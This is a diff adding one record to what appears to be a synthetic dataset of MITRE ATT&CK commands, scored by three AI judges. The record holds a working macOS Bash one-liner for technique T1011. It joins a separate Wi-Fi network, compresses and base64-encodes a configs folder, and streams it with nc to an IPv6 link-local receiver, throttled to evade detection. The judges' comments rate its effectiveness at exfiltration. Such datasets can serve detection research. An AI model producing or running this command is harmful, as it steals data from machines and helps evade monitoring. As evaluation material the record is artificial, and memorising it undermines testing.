@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
+  "explanation": "Streams base64-encoded config data line-by-line over a separate Wi\u2011Fi SSID to an IPv6 link-local receiver on a high port, reducing burst signatures and using an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Ensure no active connection to monitored Wi\u2011Fi.",
+    "Join a staging SSID separate from the primary channel.",
+    "Compress and base64-encode the configs.",
+    "Throttle and send line-by-line over IPv6 link-local tied to en0 on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-80a90c22",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, correct use of && and pipes, valid flags, and a properly closed while loop.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates packaging and transmission of data over an alternate Wi\u2011Fi and IPv6 link-local via nc, aligning with T1011, but reliance on sudo/networksetup privileges and openssl -A likely producing a single long line slightly undermine the claimed line-by-line throttled exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T02:03:05.113180Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&, |), balanced quotes, valid flags for all tools (airport, networksetup, tar, openssl, nc), and appropriate piping between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by first connecting to a specific Wi-Fi network, then compressing config files, encoding them with base64, and exfiltrating them line-by-line over IPv6 to a specific port with timing controls to avoid detection - perfectly aligning with T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:03:08.614088Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command separators, balanced quoting, valid flags for each utility, and a properly structured bash while loop.",
+        "semantic_score": 3,
+        "semantic_justification": "While the data processing and streaming logic (tar, openssl base64, nc loop with sleep) correctly implements automated exfiltration and burst signature reduction, the initial steps to switch Wi-Fi networks (`airport` and `networksetup`) require elevated privileges, contradicting the stated 'Privilege: None' and thus preventing the command from achieving its claimed intent of using a 'separate Wi\u2011Fi SSID' as an alternate network medium.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:03:34.325322Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
